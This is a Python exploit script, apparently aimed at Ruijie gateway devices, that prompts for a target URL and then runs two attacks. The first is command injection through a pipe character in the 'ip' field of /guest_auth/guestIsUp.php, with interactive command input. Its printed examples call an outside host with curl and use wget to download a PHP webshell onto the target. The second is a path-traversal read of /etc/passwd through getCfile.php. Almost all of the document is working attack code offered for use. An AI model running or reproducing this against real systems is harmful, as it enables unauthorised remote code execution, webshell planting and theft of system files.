import requests
import optparse
import urllib3
urllib3.disable_warnings()

print('''
 ____                 _____                       ____    ____      
/\  _`\           __ /\___ \  __                 /\  _`\ /\  _`\    
\ \ \L\ \  __  __/\_\\/__/\ \/\_\     __         \ \ \L\_\ \ \L\_\  
 \ \ ,  / /\ \/\ \/\ \  _\ \ \/\ \  /'__`\ _______\ \  _\L\ \ \L_L  
  \ \ \\ \\ \ \_\ \ \ \/\ \_\ \ \ \/\  __//\______\\ \ \L\ \ \ \/, \
  
   \ \_\ \_\ \____/\ \_\ \____/\ \_\ \____\/______/ \ \____/\ \____/
    \/_/\/ /\/___/  \/_/\/___/  \/_/\/____/          \/___/  \/___/ 
                                           by capOnKing
==================================================================''')
def cmdParam():
    global options,args,response,header
    try:
        parse=optparse.OptionParser(usage="%prog -u http://www.baidu.com\t ",version="v1.0")   #实例化命令行参数
        parse.add_option("-u","--url",dest="url",type=str,help="please input target url!",metavar="url")
        options,args=parse.parse_args()       
        print("\n[+]测试url: " + options.url + "\n")
    except Exception as e:
        sys.exit("[!]请使用-h参数查看帮助！")

def poc():
    #RCE
    print("==================================================================RCE\n[+]测试第一个漏洞：RCE")
    url = options.url
    print("[+]以下为命令示例(漏洞无回显，另经测试bash反弹似乎有问题)：")
    payloadPath = "/guest_auth/guestIsUp.php"
    print("\n1.curl http://eg.test.dnslog.link\t\t#检测漏洞存在与否\n2.wget http://x.x.x.x/123.txt -O l8iw7yhk.php\t#上传shell后的路径:" + url + "/guest_auth/l8iw7yhk.php\n")
    cmd = input("cmd>")
    headers = {
    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0",
    "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/x-www-form-urlencoded"
    }   
    datas = {"mac":"1","ip":"|" + cmd}
    payload = url + payloadPath
    print("\n[+]正在测试：" + payload)
    r = requests.post(payload , headers=headers , timeout=5 , verify=False , data = datas)
    if r.status_code == 200:
        print("[+]发现网站存活，请自行查看回显确认漏洞情况。\n")
    else:
        print("[!]请检查网站路径是否正确，是否为锐捷网关。")   
        
        
    #任意文件读取
    print("==================================================================任意文件读取\n[+]测试第二个漏洞：任意文件读取")    
    payloadPath = "/local/auth/php/getCfile.php"
    payload = url + payloadPath
    datas = {"cf":"../../../../../../../../../etc/passwd","field":"1"}
    r = requests.post(payload , headers=headers , timeout=5 , verify=False , data = datas) 
    result = r.text
    if result != None and r.status_code != 404 and 'root' in result:
        print(r.content)
        print("[+]另发现目标存在任意文件读取漏洞!")  
    else:
        print("[!]测试结果：如果目标是Linux，则发现不存在任意文件读取漏洞。windows自测")          
def main():
    cmdParam()
    poc()

if "__main__" == __name__:
    main()